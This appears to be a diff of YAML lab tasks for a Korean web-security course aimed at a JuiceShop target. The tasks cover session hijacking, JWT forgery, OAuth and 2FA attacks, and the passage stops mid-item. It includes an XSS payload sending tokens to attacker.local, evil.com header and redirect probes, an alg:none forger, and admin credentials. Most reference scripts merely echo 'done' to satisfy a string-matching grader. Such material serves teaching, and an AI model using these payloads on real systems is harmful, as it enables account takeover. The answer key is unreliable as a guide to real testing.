+- order: 5
+  instruction: '{{WEB_IP}} 대상으로 세션 고정 공격 테스트을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
+    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 세션 고정 공격 테스트 관련 도구와 기법을 활용하세요.
+  category: session
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 세션 고정 공격 테스트을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 고정 공격\
+    \ 테스트 완료'"
+  answer_detail: 세션 고정 공격 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+    semantic:
+      intent: 세션 고정(Session Fixation) — 로그인 전 제공한 세션 ID 가 로그인 후에도 유지되는지 검증 (재생성 안하면
+        취약)
+      success_criteria:
+      - 미인증 상태 세션 쿠키 획득
+      - 해당 쿠키 지참 로그인 후 세션 ID 변경 여부 확인
+      - 변경되지 않으면 Session Fixation 취약 판정
+      acceptable_methods:
+      - curl -c cookies.txt <login_page> 후 -b cookies.txt 로 로그인
+      - Burp Repeater 로 쿠키 비교
+      - python requests session 으로 로그인 전후 비교
+      - OWASP Testing Guide WSTG-SESS-03 참조
+      negative_signs:
+      - 쿠키 비교 없음
+      - 로그인 전후 동일 여부 판정 누락
+      - 세션 재생성 권고 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 고정 공격\
+    \ 테스트 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 세션 고정 공격 테스트을(를) 수행해줘
+
+
+    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
+    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
+- order: 6
+  instruction: '{{WEB_IP}} 대상으로 세션 하이재킹 시뮬레이션을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
+    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 세션 하이재킹 시뮬레이션 관련 도구와 기법을 활용하세요.
+  category: session
+  points: 12
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 세션 하이재킹 시뮬레이션을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 하이재킹\
+    \ 시뮬레이션 완료'"
+  answer_detail: 세션 하이재킹 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - hijack
+    field: stdout
+    semantic:
+      intent: 세션 하이재킹 시뮬레이션 — 타인의 세션 쿠키 탈취 가정 후 해당 쿠키로 요청해 권한 이관 여부 확인
+      success_criteria:
+      - 쿠키 복제 후 curl -b 또는 브라우저 DevTools 로 대체 로그인
+      - 세션 소유자 식별 응답(프로필 페이지 등) 확인
+      - HttpOnly/Secure 누락이 탈취 경로 확장 설명
+      acceptable_methods:
+      - curl -b "session=<hijacked>" <protected_url>
+      - browser cookie editor extension
+      - python requests cookies={...}
+      - BeEF cookie steal module
+      negative_signs:
+      - 쿠키 재사용 없이 개념만
+      - 권한 이관 확인 없음
+      - HttpOnly/Secure 언급 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 하이재킹\
+    \ 시뮬레이션 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 세션 하이재킹 시뮬레이션을(를) 수행해줘
+
+
+    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
+    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
+- order: 7
+  instruction: '{{WEB_IP}} 대상으로 JWT 토큰 구조 분석을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
+    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
+    해야 채점 통과.'
+  hint: JWT 토큰 구조 분석 관련 도구와 기법을 활용하세요.
+  category: jwt
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 JWT 토큰 구조 분석을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 토큰 구조\
+    \ 분석 완료'"
+  answer_detail: JWT 토큰 구조 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - 10.20.30.80
+    field: stdout
+    semantic:
+      intent: JWT 토큰 구조 분석 — 3부(Header.Payload.Signature) Base64URL 디코드 후 alg·type·클레임
+        확인
+      success_criteria:
+      - JWT Base64URL 디코드 명령 또는 jwt.io 예시
+      - Header alg·Payload (iat, exp, sub) 클레임 최소 2개 해석
+      - 서명 검증 필요성 설명
+      acceptable_methods:
+      - echo <jwt> | cut -d. -f1 | base64 -d
+      - python jose/PyJWT 라이브러리
+      - jwt_tool --decode
+      - jwt.io 페이스트
+      negative_signs:
+      - Base64 디코드 없음
+      - 클레임 해석 없음
+      - 서명 개념 누락
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 토큰 구조\
+    \ 분석 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 JWT 토큰 구조 분석을(를) 수행해줘
+
+
+    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
+    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
+    stdout quote.'
+- order: 8
+  instruction: '{{WEB_IP}} 대상으로 JWT 서명 검증 우회 테스트을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
+    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
+    해야 채점 통과.'
+  hint: JWT 서명 검증 우회 테스트 관련 도구와 기법을 활용하세요.
+  category: jwt
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 JWT 서명 검증 우회 테스트을(를) 수행해줘\n\U0001F4CE\
+    \ 참고 (CLI): curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 서명 검증\
+    \ 우회 테스트 완료'"
+  answer_detail: JWT 서명 검증 우회 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - jwt
+    field: stdout
+    semantic:
+      intent: JWT 서명 검증 우회 — alg:none, 공개키 혼동(HS256 with RSA pubkey), 약한 HMAC 키 크래킹
+      success_criteria:
+      - alg:none 변조 후 서명 제거 공격 예시
+      - HS256↔RS256 알고리즘 confusion 개념
+      - jwt_tool 또는 hashcat 로 HMAC 키 brute
+      acceptable_methods:
+      - jwt_tool <token> -X a none
+      - jwt_tool <token> -X k <pubkey.pem>
+      - hashcat -m 16500 jwt_hashes
+      - python PyJWT decode without verify
+      negative_signs:
+      - 알고리즘 조작 없이 일반 decode 만
+      - 공개키 혼동 개념 누락
+      - 약한 키 공격 언급 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 서명 검증\
+    \ 우회 테스트 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 JWT 서명 검증 우회 테스트을(를) 수행해줘
+
+
+    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
+    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
+    stdout quote.'
+- order: 9
+  instruction: '{{WEB_IP}} 대상으로 JWT 알고리즘 변조 공격을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
+    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
+    해야 채점 통과.'
+  hint: JWT 알고리즘 변조 공격 관련 도구와 기법을 활용하세요.
+  category: jwt
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 JWT 알고리즘 변조 공격을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 알고리즘\
+    \ 변조 공격 완료'"
+  answer_detail: JWT 알고리즘 변조 공격은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+    semantic:
+      intent: JWT 알고리즘 변조 — header alg 를 none/HS256/RS256 간 변조 후 서명 재계산·무효화
+      success_criteria:
+      - Header alg 변경 방법(base64 재인코딩) 설명
+      - 서버가 alg 값을 신뢰하면 인증 우회 성공
+      - '방어: alg 화이트리스트, 서명 알고리즘 서버 강제'
+      acceptable_methods:
+      - jwt_tool -X 옵션
+      - python jose 로 수동 재서명
+      - Burp JWT Editor extension
+      - curl -H Authorization:Bearer <forged>
+      negative_signs:
+      - Header 변조 시도 없음
+      - 서명 재생성 단계 누락
+      - 방어 기법 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 알고리즘\
+    \ 변조 공격 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 JWT 알고리즘 변조 공격을(를) 수행해줘
+
+
+    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
+    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
+    stdout quote.'
+- order: 10
+  instruction: '{{WEB_IP}} 대상으로 패스워드 리셋 취약점 분석을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 패스워드 리셋 취약점 분석 관련 도구와 기법을 활용하세요.
+  category: auth
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 패스워드 리셋 취약점 분석을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 리셋\
+    \ 취약점 분석 완료'"
+  answer_detail: 패스워드 리셋 취약점 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - http_request
+    - 10.20.30.80
+    field: stdout
+    semantic:
+      intent: 패스워드 리셋 취약점 — 리셋 토큰 추측·재사용·호스트헤더 변조로 피싱 링크 주입
+      success_criteria:
+      - 리셋 토큰 엔트로피 분석 (짧거나 순차적이면 취약)
+      - Host 헤더 변조로 리셋 링크 도메인 탈취 가능성 테스트
+      - 토큰 만료·1회 사용·이메일 인증 필수 방어 언급
+      acceptable_methods:
+      - curl -H Host:evil.com /reset
+      - 여러 리셋 요청 후 토큰 비교
+      - Burp Collaborator 로 콜백 수신
+      - python requests 로 자동 재사용 테스트
+      negative_signs:
+      - 토큰 엔트로피 분석 없음
+      - Host 헤더 공격 개념 부재
+      - 방어 언급 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 리셋\
+    \ 취약점 분석 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 패스워드 리셋 취약점 분석을(를) 수행해줘
+
+
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 11
+  instruction: '{{WEB_IP}} 대상으로 2FA 우회 가능성 분석을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 2FA 우회 가능성 분석 관련 도구와 기법을 활용하세요.
+  category: auth
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 2FA 우회 가능성 분석을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '2FA 우회 가능성\
+    \ 분석 완료'"
+  answer_detail: 2FA 우회 가능성 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - 10.20.30.80
+    field: stdout
+    semantic:
+      intent: 2FA 우회 가능성 분석 — 응답 조작, SMS 재전송 abuse, 백업 코드 무제한 시도, OAuth 우회
+      success_criteria:
+      - 2FA 엔드포인트 응답 코드/본문 분석
+      - 우회 기법 최소 2가지 (HTTP verb swap, response manipulation, 백업 코드) 제시
+      - 방어 (rate limit on 2FA, device trust, backup code 제한) 언급
+      acceptable_methods:
+      - Burp Repeater 로 응답 코드 변경
+      - python requests 로 2FA 우회 시도
+      - OWASP ASVS V2.8 참조
+      - yubikey 등 FIDO2 제안
+      negative_signs:
+      - 우회 기법 1개만
+      - rate limit 관점 없음
+      - FIDO2/하드웨어 토큰 언급 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '2FA 우회 가능성\
+    \ 분석 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 2FA 우회 가능성 분석을(를) 수행해줘
+
+
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 12
+  instruction: '{{WEB_IP}} 대상으로 OAuth 취약점 분석을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: OAuth 취약점 분석 관련 도구와 기법을 활용하세요.
+  category: auth
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.30.80 대상으로 OAuth 취약점 분석을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'OAuth 취약점\
+    \ 분석 완료'"
+  answer_detail: OAuth 취약점 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - OAuth
+    field: stdout
+    semantic:
+      intent: OAuth 취약점 — redirect_uri 변조, state 누락으로 CSRF, 토큰 탈취, Open Redirect 악용
+      success_criteria:
+      - redirect_uri 조작으로 토큰 다른 도메인 전달 시도
+      - state 매개변수 부재가 CSRF 를 유발함 설명
+      - implicit flow vs authorization code + PKCE 비교
+      acceptable_methods:
+      - curl 로 redirect_uri=https://evil.com 시도
+      - Burp 로 state 제거 후 재전송
+      - OAuth 2.0 Security BCP 참조
+      - PKCE 강제 확인
+      negative_signs:
+      - redirect_uri 공격 언급 없음
+      - state/PKCE 누락
+      - OAuth Flow 차이 설명 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'OAuth 취약점\
+    \ 분석 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 OAuth 취약점 분석을(를) 수행해줘
+
+
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 13
+  instruction: '{{WEB_IP}} 대상으로 안전한 세션 관리 구현 방안을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
+    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 안전한 세션 관리 구현 방안 관련 도구와 기법을 활용하세요.
+  category: defense
+  points: 10
+  answer: '🤖 프롬프트: 10.20.30.80 대상으로 안전한 세션 관리 구현 방안을(를) 수행해줘
+
+    📎 참고 (CLI): echo ''=== 안전한 세션 관리 구현 방안 ==='' && echo ''조치 방안 정리 완료'''
+  answer_detail: 안전한 세션 관리 구현 방안은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+    semantic:
+      intent: 안전한 세션 관리 — HttpOnly/Secure/SameSite 쿠키 + 랜덤 세션 ID(>=128bit) + 로그인 후
+        세션 재생성 + 적절한 만료
+      success_criteria:
+      - 쿠키 속성 3개(HttpOnly/Secure/SameSite) 설정 권장
+      - 세션 ID 엔트로피 >=128bit 권고
+      - 로그아웃·비활성 타임아웃·절대 만료 언급
+      acceptable_methods:
+      - OWASP Session Management Cheat Sheet
+      - Express-session 설정 예
+      - Django SESSION_COOKIE_* 설정
+      - iron-session / NextAuth 등 라이브러리
+      negative_signs:
+      - 방어 요소 2개 이하
+      - 세션 재생성 누락
+      - 만료 정책 없음
+  target_vm: attacker
+  script: echo '=== 안전한 세션 관리 구현 방안 ===' && echo '조치 방안 정리 완료'
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 안전한 세션 관리 구현 방안을(를) 수행해줘
+
+
+    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
+    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
+- order: 14
+  instruction: '{{WEB_IP}} 대상으로 인증 강화 권고 작성을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
+    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 인증 강화 권고 작성 관련 도구와 기법을 활용하세요.
+  category: defense
+  points: 12
+  answer: '🤖 프롬프트: 10.20.30.80 대상으로 인증 강화 권고 작성을(를) 수행해줘
+
+    📎 참고 (CLI): echo ''=== 인증 강화 권고 작성 ==='' && echo ''조치 방안 정리 완료'''
+  answer_detail: 인증 강화 권고 작성은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+    semantic:
+      intent: 인증 강화 권고 — MFA 의무화, 패스워드리스, WebAuthn/FIDO2, 로그인 이상행위 탐지(UEBA)
+      success_criteria:
+      - MFA 종류 2개 이상 언급 (TOTP, FIDO2, Push)
+      - WebAuthn/Passkey 개념
+      - 이상행위(UEBA) 로그인 탐지 지표 제시
+      acceptable_methods:
+      - Google/Microsoft Account 2FA 옵션
+      - NIST SP 800-63B AAL1-3 레벨
+      - Auth0/Okta 스몰빌
+      - Wazuh 또는 Splunk UEBA 상관규칙
+      negative_signs:
+      - MFA 1가지만
+      - WebAuthn/Passkey 누락
+      - UEBA 개념 없음
+  target_vm: attacker
+  script: echo '=== 인증 강화 권고 작성 ===' && echo '조치 방안 정리 완료'
+  risk_level: low
+  bastion_prompt: '10.20.30.80 대상으로 인증 강화 권고 작성을(를) 수행해줘
+
+
+    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
+    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
+- order: 15
+  instruction: '인증/세션 취약점 실습 종합 보고서를 작성하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
+    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 발견 취약점, 영향, 조치를 포함하세요.
+  category: verification
+  points: 8
+  answer: '🤖 프롬프트: 인증/세션 취약점 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
+
+    📎 참고 (CLI): echo ''=== 인증/세션 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.30.80''
+    && echo ''=== 보고서 완료 ==='''
+  answer_detail: 취약점 진단 보고서는 발견사항, 위험도, 재현 방법, 조치 권고를 포함합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 보고서 완료
+    - 10.20.30.80
+    - OAuth2
+    - report
+    field: stdout
+    semantic:
+      intent: 인증/세션 실습 종합 리포트 — 분석·Exploit·방어 전략을 /tmp/auth_session_report.txt 로 정리
+      success_criteria:
+      - 4 섹션 이상 (로그인/세션/JWT/OAuth·MFA)
+      - PoC 또는 탐지 로그 1개 이상
+      - 파일 저장 후 cat 확인
+      acceptable_methods:
+      - heredoc markdown
+      - echo -e 다줄
+      - json/yaml 구조화
+      - python 템플릿
+      negative_signs:
+      - 섹션 2 미만
+      - PoC 없음
+      - 파일 저장 없음
+  target_vm: attacker
+  script: 'echo ''=== 인증/세션 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.30.80'' &&
+    echo ''=== 보고서 완료 ==='''
+  risk_level: low
+  bastion_prompt: '인증/세션 취약점 실습 종합 보고서를 작성하시오.
+
+
+    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
+    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
+- order: 99
+  instruction: '[복합 시나리오] "JWT 알고리즘 변조 + XSS 토큰 탈취 chain — 인증 자격증명 체인 공격"
+
+
+    ■ 상황 (w05 → w06 시나리오 연속)
+
+
+    w05 에서 SQLi·Upload 매트릭스를 마쳤다. 선배가 다음.
+
+
+    ※ 선배: "단일 취약점은 어렵지 않은데, 진짜 위험은 *체인* 이야.
+
+    ※ JWT 가 alg=none 으로 변조되면 서명 우회. 거기다 XSS 가 있으면 localStorage 의 토큰을 빼낼 수 있고.
+
+    ※ 둘 다 막혀 있으면 안전하지만, 한쪽만 뚫려도 *권한 상승 + 자격증명 탈취* 가 동시에 발생해.
+
+    ※ JuiceShop 에서 JWT 변조 PoC 만들고, XSS payload 로 토큰 탈취 시연 + 방어 매트릭스 정리해."
+
+
+    학습 목표 (lecture #1·#2 XSS 3 유형 + #3 CSRF) + (lab #7·#8·#9 JWT 변조 + #6 세션 하이재킹)
+    통합.
+
+
+    ■ 임무 (3 단계, 약 35분)
+
+
+    ▶ Phase A — JWT 알고리즘 변조 (lab #7·#8·#9)
+
+    Phase 1) `curl -s -X POST -H "Content-Type: application/json"
+
+    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' http://10.20.30.80/rest/user/login`
+    로 JWT 획득.
+
+    Phase 2) header 에서 `{"alg":"HS256"...}` → `{"alg":"none"...}` 변조. 서명 부분 제거.
+
+    Phase 3) `python3 -c "import base64; h=base64.urlsafe_b64encode(b''{\"alg\":\"none\",\"typ\":\"JWT\"}'').rstrip(b''='').decode();
+    ..."` 형태로
+
+    변조 토큰 생성. `curl -H "Authorization: Bearer <변조>" http://10.20.30.80/rest/user/whoami`
+    로 인증 우회 시도.
+
+
+    ▶ Phase B — XSS payload 로 JWT 탈취 (lecture #1·#2)
+
+    JuiceShop 의 search 또는 review 입력란에 stored 또는 reflected XSS payload 작성.
+
+    Payload: `<script>fetch(''http://attacker.local/steal?t=''+localStorage.getItem(''token''))</script>`
+
+    PoC 로 텍스트 출력. 실제 외부 callback 은 환경 제약 → curl 로 attacker 측 수신 시뮬레이션:
+
+    `nc -lk 9999 &` 후 `curl "http://localhost:9999/steal?t=$(JWT)"`.
+
+
+    ▶ Phase C — 인증 자격증명 방어 매트릭스
+
+    | 위협 | 공격면 | 방어 1 | 방어 2 | 잔존 위험 |
+
+    | JWT alg 변조 | server alg whitelist | strict alg check | RS256 사용 | key leak |
+
+    | localStorage 탈취 | XSS | HttpOnly Cookie 사용 | CSP 설정 | XSS+CSRF chain |
+
+    | Cookie 탈취 | XSS + Cookie 접근 | HttpOnly + Secure | SameSite=Strict | network
+    mitm |
+
+    | Refresh token 탈취 | 영구 자격증명 | rotation + short TTL | device binding | refresh
+    leak |
+
+    표 끝에 "JuiceShop 권고: alg whitelist + HttpOnly Cookie + SameSite=Strict + refresh
+    rotation" 한 줄.
+
+
+    종료: echo "=== Phase A JWT 변조 ===" / "=== Phase B XSS 탈취 ===" / "=== Phase C 매트릭스
+    ===" 묶음.
+
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
+    정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
+    답변에 직접 quote** 해야 채점 통과.'
+  bastion_prompt: "[복합 시나리오 — w06 JWT 변조 + XSS 토큰 탈취 chain]\n\nJuiceShop (http://10.20.30.80)\
+    \ 인증 자격증명 chain 공격 점검 3 phase.\n\nPhase A (JWT alg 변조):\n1) `curl -s -X POST -H\
+    \ \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op\",\"password\"\
+    :\"admin123\"}'\n    http://10.20.30.80/rest/user/login` 응답에서 JWT 획득.\n2) python3\
+    \ 으로 alg=none 변조 토큰 생성:\n   `python3 -c \"import base64; h=base64.urlsafe_b64encode(b'{\\\
+    \"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}').rstrip(b'=').decode();\n   \
+    \ p='<원본 payload base64>'; print(f'{h}.{p}.')\"`\n3) `curl -i -H \"Authorization:\
+    \ Bearer <변조>\" http://10.20.30.80/rest/user/whoami` 결과 캡처.\n   (보통 거부됨 — 그게 JuiceShop\
+    \ 의 정상 동작)\n\nPhase B (XSS payload + JWT 탈취 시뮬레이션):\nXSS payload 텍스트 출력: `<script>fetch('http://attacker.local/steal?t='+localStorage.getItem('token'))</script>`\n\
+    공격자 측 수신 시뮬: `nc -lk 9999 &` 후 다른 터미널에서 `curl \"http://localhost:9999/steal?t=FAKEJWT\"\
+    `.\n`kill %1` 로 nc 종료. 토큰 탈취 흐름 PoC.\n\nPhase C (방어 매트릭스):\n```\n| 위협 | 공격면 |\
+    \ 방어 1 | 방어 2 | 잔존 위험 |\n| JWT alg 변조 | server alg whitelist | strict alg check\
+    \ | RS256 사용 | key leak |\n| localStorage 탈취 | XSS | HttpOnly Cookie 사용 | CSP\
+    \ 설정 | XSS+CSRF chain |\n| Cookie 탈취 | XSS + Cookie 접근 | HttpOnly + Secure | SameSite=Strict\
+    \ | network mitm |\n| Refresh token 탈취 | 영구 자격증명 | rotation + short TTL | device\
+    \ binding | refresh leak |\n```\n표 끝에 \"JuiceShop 권고: alg whitelist + HttpOnly\
+    \ Cookie + SameSite=Strict + refresh rotation\" 한 줄.\n\n종료: echo \"=== Phase A\
+    \ JWT 변조 ===\" / \"=== Phase B XSS 탈취 ===\" / \"=== Phase C 매트릭스 ===\" 묶음.\n\n\
+    반드시 3 phase 모두 실행. 중간 종료 금지.\n\n[도구 권장] integration_scenario: 여러 도구 chain — 정찰\
+    \ (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain —\
